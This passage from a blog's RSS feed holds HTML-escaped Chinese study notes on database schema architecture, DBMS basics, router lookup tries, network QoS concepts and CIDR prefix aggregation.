      <description>&lt;h2 id=&#34;数据库体系结构&#34;&gt;数据库体系结构&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;从模式的角度描述一般数据库系统的概念和结构&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;可以用于解释特定数据库系统的内部结构&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ANSI/SPARC体系结构——三级模式结构＋两级映象&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Oracle、Informix等SQL数据库系统的模式结构可通过ANSI/SPARC体系结构进行解释&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;模式（Schema）和实例（Instance）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;模式是数据库中全体数据的逻辑结构和特征的描述，它仅仅涉及类型的描述，不涉及具体的值&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;模式的一个具体值称为模式的一个实例&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401091025914.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;模式类型&lt;/th&gt;&#xA;          &lt;th&gt;描述&lt;/th&gt;&#xA;          &lt;th&gt;特点&lt;/th&gt;&#xA;          &lt;th&gt;视图&lt;/th&gt;&#xA;          &lt;th&gt;DDL&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;概念模式&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;数据库中全体数据的逻辑结构和特征的描述&lt;/td&gt;&#xA;          &lt;td&gt;不涉及数据物理存储的细节和硬件环境，一个数据库只有一个概念模式&lt;/td&gt;&#xA;          &lt;td&gt;概念视图&lt;/td&gt;&#xA;          &lt;td&gt;通过模式DDL进行定义&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;外模式&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;单个用户所看到的局部数据的逻辑结构和特征的描述&lt;/td&gt;&#xA;          &lt;td&gt;用户与数据库系统的数据接口，对于用户而言，外模式就是数据库，同一模式上可有多个不同的外模式&lt;/td&gt;&#xA;          &lt;td&gt;外部视图&lt;/td&gt;&#xA;          &lt;td&gt;通过子模式DDL进行定义&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;内模式&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;数据物理结构和存储方式的描述&lt;/td&gt;&#xA;          &lt;td&gt;不涉及物理块（或页）的大小，也不考虑具体设备的柱面或磁道大小，一个数据库只有一个内模式&lt;/td&gt;&#xA;          &lt;td&gt;内部视图&lt;/td&gt;&#xA;          &lt;td&gt;通过内模式DDL定义&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h3 id=&#34;数据库的三级模式结构&#34;&gt;数据库的三级模式结构&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;概念模式（模式、逻辑模式）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据库中全体数据的逻辑结构和特征的描述&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据记录由哪些数据项构成&lt;/li&gt;&#xA;&lt;li&gt;数据项的名字、类型、取值范围&lt;/li&gt;&#xA;&lt;li&gt;数据之间的联系、数据的完整性等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;不涉及数据物理存储的细节和硬件环境&lt;/li&gt;&#xA;&lt;li&gt;一个数据库只有一个概念模式&lt;/li&gt;&#xA;&lt;li&gt;概念视图：概念模式的实例&lt;/li&gt;&#xA;&lt;li&gt;通过模式DDL进行定义&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;外模式（子模式、用户模式）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;单个用户所看到的局部数据的逻辑结构和特征的描述&lt;/li&gt;&#xA;&lt;li&gt;用户与数据库系统的数据接口，对于用户而言，外模式就是数据库&lt;/li&gt;&#xA;&lt;li&gt;建立在概念模式之上，同一模式上可有多个不同的外模式&lt;/li&gt;&#xA;&lt;li&gt;外部视图：外模式的实例&lt;/li&gt;&#xA;&lt;li&gt;通过子模式DDL进行定义&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;内模式（存储模式）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据物理结构和存储方式的描述&#xA;&lt;ul&gt;&#xA;&lt;li&gt;记录的存储方式：&lt;!-- raw HTML omitted --&gt;顺序存储、按B树组织还是散列存储？&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;索引按什么方式组织：排序、散列？&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;数据是否加密？是否压缩存储？&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;不涉及物理块（或页）的大小，也不考虑具体设备的柱面或磁道大小&lt;/li&gt;&#xA;&lt;li&gt;一个数据库只有一个内模式&lt;/li&gt;&#xA;&lt;li&gt;内部视图：内模式的实例&lt;/li&gt;&#xA;&lt;li&gt;通过内模式DDL定义&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;二级映象和数据独立性&#34;&gt;二级映象和数据独立性&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;二级映象实现三级模式结构间的联系和转换，使用户可以逻辑地处理数据，不必关系数据的底层表示方式和存储方式&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401091034656.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;外模式/模式映象&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>第1章 数据库系统概述</title>
      <link>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC1%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</link>
      <pubDate>Wed, 10 Jan 2024 00:40:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC1%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</guid>
      <description>&lt;h2 id=&#34;11-dbms系统结构组成&#34;&gt;1.1. DBMS系统结构组成&lt;/h2&gt;&#xA;&lt;h2 id=&#34;数据库dbms数据库系统等基本概念&#34;&gt;数据库、DBMS、数据库系统等基本概念&lt;/h2&gt;&#xA;&lt;h3 id=&#34;数据&#34;&gt;数据&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据(Data)是数据库中存储的基本对象&lt;/li&gt;&#xA;&lt;li&gt;数据的定义&#xA;&lt;ul&gt;&#xA;&lt;li&gt;人们用来反映客观世界而记录下来的可以鉴别的符号&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;数据的种类&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数值数据：0－9&lt;/li&gt;&#xA;&lt;li&gt;非数值数据：字符、文字、声音、图形、图像等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;数据的特点&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据与其语义是不可分的&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;例子1：93是一个数据&#xA;&lt;ul&gt;&#xA;&lt;li&gt;语义1：学生某门课的成绩&lt;/li&gt;&#xA;&lt;li&gt;语义2：某人的体重&lt;/li&gt;&#xA;&lt;li&gt;语义3：计算机学院2016级学生人数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;例子2：学生档案记录（李明，197205，中国科大，1990）&#xA;&lt;ul&gt;&#xA;&lt;li&gt;语义1：学生，出生年月，所在学校，毕业年份&lt;/li&gt;&#xA;&lt;li&gt;语义2： 学生，出生年月，录取大学，入学时间&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;数据库&#34;&gt;数据库&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据库的定义&#xA;数据库(Database,简称DB)是长期储存在计算机内、有&#xA;组织的、可共享的大量数据的集合&lt;/li&gt;&#xA;&lt;li&gt;数据库的基本特征&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据按一定的数据模型组织、描述和储存&lt;/li&gt;&#xA;&lt;li&gt;可为各种用户共享&lt;/li&gt;&#xA;&lt;li&gt;数据间联系密切，具有最小的冗余度和较高的独立性&lt;/li&gt;&#xA;&lt;li&gt;服务于某个特定的应用&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;例：图书馆的图书数据库、机场的航班数据库、银行数据库……&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;数据库模式-schema&#34;&gt;数据库模式 (Schema)&lt;/h3&gt;&#xA;&lt;p&gt;数据库模式是数据库中全体数据的逻辑结构和特征的描述&#xA;![[Pasted image 20240108110812.png]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;数据库管理系统&#34;&gt;数据库管理系统&lt;/h3&gt;&#xA;&lt;p&gt;DBMS（Database Management System），是计算机程序的集&#xA;合，用于创建和维护数据库&#xA;![[Pasted image 20240108110347.png]]&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;位于操作系统和用户应用之间&lt;/li&gt;&#xA;&lt;li&gt;总是基于某种数据模型&lt;/li&gt;&#xA;&lt;li&gt;数据库厂商的产品通常指DBMS，如Oracle11g、Microsoft SQL Server 2008、DB2、MySQL等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;dbms一般架构&#34;&gt;DBMS一般架构&lt;/h3&gt;&#xA;&lt;p&gt;![[Pasted image 20240108210938.png]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;数据库系统&#34;&gt;数据库系统&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;DBS（DataBase System），指在计算机系统中引入了数据库后的系统，即采用了数据库技术的计算机系统&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;数据库设计问题&#34;&gt;数据库设计问题&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;如何设计和实现一个DBMS来高效的组织和管理数据库？——DBMS实现问题    研究生课程内容&lt;/li&gt;&#xA;&lt;li&gt;如何针对特定应用的需求设计一个合理的数据库结构？——数据库设计问题       本科课程内容&lt;/li&gt;&#xA;&lt;li&gt;应用程序如何有效地存取数据库中的数据？——数据库存取问题      本科课程内容&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;dbms实现问题&#34;&gt;DBMS实现问题&lt;/h2&gt;&#xA;&lt;p&gt;1、一个虚拟的DBMS：Megatron2000&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;UNIX下的关系型DBMS，支持SQL&lt;/li&gt;&#xA;&lt;li&gt;实现细节&#xA;&lt;ul&gt;&#xA;&lt;li&gt;关系通过文件（ASCII）存储，e.g. R存储在/usr/db/R中&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;  Smith # 123 # CS&#xA;  Jones # 522 # EE&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt; - 数据库模式存储在特定的文件（ASCII）中&#xA;&#x9;R1 # A # INT # B # STR …&#xA;&#x9;R2 # C # STR # A # INT …&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;Megatron 2000如何执行查询？&#xA;执行 “&lt;strong&gt;select * from R where condition&lt;/strong&gt;”:&lt;/p&gt;</description>
    </item>
    <item>
      <title>信息网络协议基础第六章复习</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E5%85%AD%E7%AB%A0/</link>
      <pubDate>Wed, 03 Jan 2024 18:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E5%85%AD%E7%AB%A0/</guid>
      <description>&lt;h2 id=&#34;路由器功能与架构&#34;&gt;路由器功能与架构&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据路径功能&#xA;&lt;ul&gt;&#xA;&lt;li&gt;根据分组目的IP地址查找转发表&lt;/li&gt;&#xA;&lt;li&gt;通过交换结构转发到输出端口&lt;/li&gt;&#xA;&lt;li&gt;输出端口调度和队列管理&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;控制面功能&#xA;&lt;ul&gt;&#xA;&lt;li&gt;运行路由协议，构建路由表&lt;/li&gt;&#xA;&lt;li&gt;系统配置和管理&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;路由查找算法&#34;&gt;路由查找算法&lt;/h2&gt;&#xA;&lt;h3 id=&#34;binary-trie&#34;&gt;Binary Trie&lt;/h3&gt;&#xA;&lt;p&gt;![[Pasted image 20240102174052.png]]&#xA;![[Pasted image 20240102174131.png]]&lt;/p&gt;&#xA;&lt;p&gt;####性能&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;最差情况下，查找算法需要遍历Trie的所有层次，所以最差情况下需要有W次存储器访问，W为前缀的最大长度，对于IPv4为32，查找复杂度和更新复杂度为O(W)&lt;/li&gt;&#xA;&lt;li&gt;最差情况下，增加一个前缀，需要增加W个节点，存储复杂度为O(NW)，N为转发表中的前缀数量&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;leaf-pushing&#34;&gt;Leaf Pushing&lt;/h3&gt;&#xA;&lt;p&gt;![[Pasted image 20240102174439.png]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;path-compression&#34;&gt;Path Compression&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Compression：Trie中只有一个子节点的非前缀节点能够被删除&lt;/li&gt;&#xA;&lt;li&gt;节点保持Compression相关信息&#xA;&lt;ul&gt;&#xA;&lt;li&gt;skip value：指示路径上有多少个比特被跳过&lt;/li&gt;&#xA;&lt;li&gt;segment：指示最后一次跳过操作以来具体遗漏的比特串&#xA;![[Pasted image 20240102175058.png]]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;性能&#xA;&lt;ul&gt;&#xA;&lt;li&gt;路径压缩可以有效地减少稀疏binary trie的高度&lt;/li&gt;&#xA;&lt;li&gt;在最差情况下，没有压缩的可能，因此采用路径压缩后查询和更新复杂度与binary trie一样，都是O(W)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;multi-bit-trie&#34;&gt;Multi-bit Trie&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;查找时同时检查多个比特，称为查找步长（Stride）&lt;/li&gt;&#xA;&lt;li&gt;如果前缀长度不为步长的整数倍，则对其进行扩充&lt;/li&gt;&#xA;&lt;li&gt;例如步长为3，对于前缀1*可以扩充为100,101,110,111&lt;/li&gt;&#xA;&lt;li&gt;步长为k，则Trie中的每个节点的条目数量为2k&lt;/li&gt;&#xA;&lt;li&gt;每个条目组成：&amp;lt;下一跳信息，指向下一个子节点的指针（可以为空）&amp;gt;&#xA;![[Pasted image 20240102183349.png]]&lt;/li&gt;&#xA;&lt;li&gt;性能&#xA;&lt;ul&gt;&#xA;&lt;li&gt;步长为k比特，则查找的复杂度为O(W/k)，W为地址的长度&lt;/li&gt;&#xA;&lt;li&gt;更新复杂度O(W/k*2^k),每个节点有2^k个条目&lt;/li&gt;&#xA;&lt;li&gt;存储（空间）复杂度O(N*2^k*W/k),N为转发表表项数量&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;leaf-pushing优化&#34;&gt;Leaf Pushing优化&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;节点上的每个条目要么包含一个指针，要么包含下一跳信息&lt;/li&gt;&#xA;&lt;li&gt;相当于把下一跳信息Push down到叶子节点&lt;/li&gt;&#xA;&lt;li&gt;存储空间减少为1/2&#xA;![[Pasted image 20240102183713.png]]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;lc-trie构造&#34;&gt;LC Trie构造&lt;/h3&gt;&#xA;&lt;p&gt;节点分布稀疏时，Path Compression是压缩Trie的有效途径&#xA;固定步长multi-bit能够提高查找性能，但是当节点分布稀疏时存储冗余大  节点分布越密，存储效率越高，完全Trie无冗余！&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;如果Trie的中间节点包含前缀，则进行Leaf Pushing操作，使得Trie中只有叶子节点包含前缀（即为前缀节点）&lt;/li&gt;&#xA;&lt;li&gt;通过Path Compression将Trie压缩（就是去掉只有一个孩子的节点）&lt;/li&gt;&#xA;&lt;li&gt;当子Trie的结构为完全子Trie时执行Multi-bit查找（完全二叉树只留叶子结点）&#xA;在LC Trie中每个节点需要保存：&lt;/li&gt;&#xA;&lt;li&gt;Path Compression信息(Skip Value, Segment)&lt;/li&gt;&#xA;&lt;li&gt;Multi-bit查找信息 (Stride)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;![[Pasted image 20240102185801.png]]&lt;/p&gt;</description>
    </item>
    <item>
      <title>信息网络协议基础第五章复习</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%94%E7%AB%A0/</link>
      <pubDate>Tue, 02 Jan 2024 18:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%94%E7%AB%A0/</guid>
      <description>&lt;p&gt;•基本概念&lt;/p&gt;&#xA;&lt;p&gt;–QoS度量参数；流、行为集合、服务等级协议&lt;/p&gt;&#xA;&lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;&#xA;&lt;h3 id=&#34;qos度量参数&#34;&gt;QoS度量参数&lt;/h3&gt;&#xA;&lt;p&gt;常用的描述QoS需求的参数包括：带宽、延迟、延迟抖动、突发（峰值）速率、最大突发长度、丢包率&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;带宽 ：给定介质、协议或连接的额定吞吐量，实际上指应用程序在网络中通信所需要的“管道大小”，也可以认为是用户对网络传输速率的要求&#xA;&lt;ul&gt;&#xA;&lt;li&gt;最小带宽（最小分组速率）：传输中的最小瞬时速率，可用产生两个相邻分组的最大时间间隔的倒数来表示&lt;/li&gt;&#xA;&lt;li&gt;峰值带宽（峰值分组速率）：传输中的最大瞬时速率，可用产生两个相邻分组的最短时间间隔的倒数来表示&lt;/li&gt;&#xA;&lt;li&gt;平均带宽（平均分组速率）：一段时间内分组传输的平均速率&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;延迟：分组从发送端到达接收端的时间间隔&#xA;&lt;ul&gt;&#xA;&lt;li&gt;传输延迟：发送分组的第一个比特到发送最后一个比特的时间间隔，取决于发送接口的速率和分组的大小&lt;/li&gt;&#xA;&lt;li&gt;传播延迟：发送分组的一个比特到接收端接收到该比特的时间间隔，取决于传输介质和传输距离&lt;/li&gt;&#xA;&lt;li&gt;处理延迟：分组从到达节点到进入输出队列的时间间隔，包括对分组头标处理，路由查找等，取决于节点的处理能力和分组处理的复杂度&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;排队延迟：分组从进入输出队列到开始输出的时间间隔，取决于队列长度和调度策略&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;![[Pasted image 20240102164138.png]]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;延迟抖动：端到端延迟的变化特性，由延迟的可变部分的变化导致的，流量的突发、不公平的队列调度算法都可能导致较大的延迟抖动&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;流&#34;&gt;流&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;从一个源到一个目的的有序分组集合被称为一个流（Flow)&lt;/li&gt;&#xA;&lt;li&gt;一般来说，流是由特定于具体应用并且具有相同QoS需求的分组所组成&lt;/li&gt;&#xA;&lt;li&gt;一个流和一个应用会话（Session）相对应，所以在后面叙述中有时将流的概念和会话的概念等同&lt;/li&gt;&#xA;&lt;li&gt;==IP网络中通常用五元组&amp;lt;源IP地址、目的IP地址、源端口号、目的端口号、协议&amp;gt;来标识一个流==&lt;/li&gt;&#xA;&lt;li&gt;在面向连接的网络中，属于同一个流的所有分组将会走相同的路径到达目的地 ，在无连接的网络中，属于同一个流的分组可能会走不同的路径到达目的地&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;行为集合&#34;&gt;行为集合&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在路由器上执行相同QoS操作的分组的集合&lt;/li&gt;&#xA;&lt;li&gt;多个流如果具有相同的QoS操作，则在路由器上可以汇聚成一个行为集合&lt;/li&gt;&#xA;&lt;li&gt;==行为集合有时与类（Class）的概念等同，流可以看作是只有1个流的行为集合或者类==&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;支持qos操作的路由器功能&#34;&gt;支持QoS操作的路由器功能&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;接纳控制&#xA;当应用要求QoS服务时，判断其要求是否能够得到满足，应该是放在每个网络的入口路由器上&lt;/li&gt;&#xA;&lt;li&gt;流量调节&#xA;检查到达的分组是否满足SLA中设定的QoS水平，如果不满足，实施事先指定的整形操作，包括丢弃、延迟、重标记等&lt;/li&gt;&#xA;&lt;li&gt;流量控制&#xA;为了满足QoS需求（带宽、丢包率、延迟、延迟抖动等），选择是否向输出链路输出分组以及控制分组的输出顺序（即队列管理和调度），该功能设置在输出端口处&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;两个服务质量模型&#34;&gt;两个服务质量模型&lt;/h2&gt;&#xA;&lt;h3 id=&#34;综合服务原理&#34;&gt;综合服务原理&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;资源预留&#xA;&lt;ol&gt;&#xA;&lt;li&gt;发送应用通过&lt;!-- raw HTML omitted --&gt;建立消息&lt;!-- raw HTML omitted --&gt;将想发送流的流量特性发送给路径上的每个路由器和接收主机&lt;/li&gt;&#xA;&lt;li&gt;路径上路由器在&lt;!-- raw HTML omitted --&gt;建立消息&lt;!-- raw HTML omitted --&gt;中附加上可以提供的QoS信息（例如预测的延迟等）送给接收主机&lt;/li&gt;&#xA;&lt;li&gt;接收应用接收&lt;!-- raw HTML omitted --&gt;预留建立&lt;!-- raw HTML omitted --&gt;消息中的QoS信息，决定数据传输所需QoS参数，并将其通过预留消息沿相反路径通知给沿途路由器和发送主机&lt;/li&gt;&#xA;&lt;li&gt;路径上的路由器根据&lt;!-- raw HTML omitted --&gt;预留消息&lt;!-- raw HTML omitted --&gt;预留所需网络资源&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;数据流传输&#xA;&lt;ul&gt;&#xA;&lt;li&gt;发送主机发送遵循预留规定的数据流&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;流量调节&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;中间路由器监测数据流是否满足预留规定，如果不满足&#xA;&lt;ul&gt;&#xA;&lt;li&gt;对于保证型服务，采用整形&lt;/li&gt;&#xA;&lt;li&gt;对于受控负载型服务，将不符合的分组转为尽力服务&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;流量控制&#xA;&lt;ul&gt;&#xA;&lt;li&gt;路由器根据指定的服务类型，对每个流的分组进行调度和队列管理，实现指定QoS（带宽、延迟等）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;综合服务类型&#34;&gt;综合服务类型&lt;/h3&gt;&#xA;&lt;p&gt;![[Pasted image 20240102171144.png]]&lt;/p&gt;</description>
    </item>
    <item>
      <title>信息网络协议基础第三章复习</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%89%E7%AB%A0/</link>
      <pubDate>Tue, 02 Jan 2024 16:12:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%89%E7%AB%A0/</guid>
      <description>&lt;h2&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;cidr&#34;&gt;CIDR&lt;/h3&gt;&#xA;&lt;p&gt;•CIDR：Classless Inter-Domain Routing，无类别域间寻路&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;目前Internet采用的IP地址分配方式，1990年代由IETF提出，取代早期的有类别的地址分配方式&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;采用可变长度的网络前缀(network prefix)来取代地址分类中网络号长度固定的做法&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;具有相同前缀的IP地址组成CIDR Block，表示为A.B.C.D/N，其中N为前缀长度&lt;/li&gt;&#xA;&lt;li&gt;例如202.38.208.0/20&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;前缀汇聚supernetting&#34;&gt;前缀汇聚(Supernetting)&lt;/h4&gt;&#xA;&lt;p&gt;前缀汇聚举例&#xA;8个连续的/24的CIDR Block可以用一个/21的CIDR Block来表示，因此对外汇聚成一条/21的路由&#xA;200.25.16.0/24&lt;del&gt;200.25.23.0/24&amp;ndash;〉&lt;br&gt;&#xA;(0001 0000&lt;/del&gt;0001 0111)&lt;br&gt;&#xA;200.25.16.0/21&lt;/p&gt;&#xA;&lt;h4 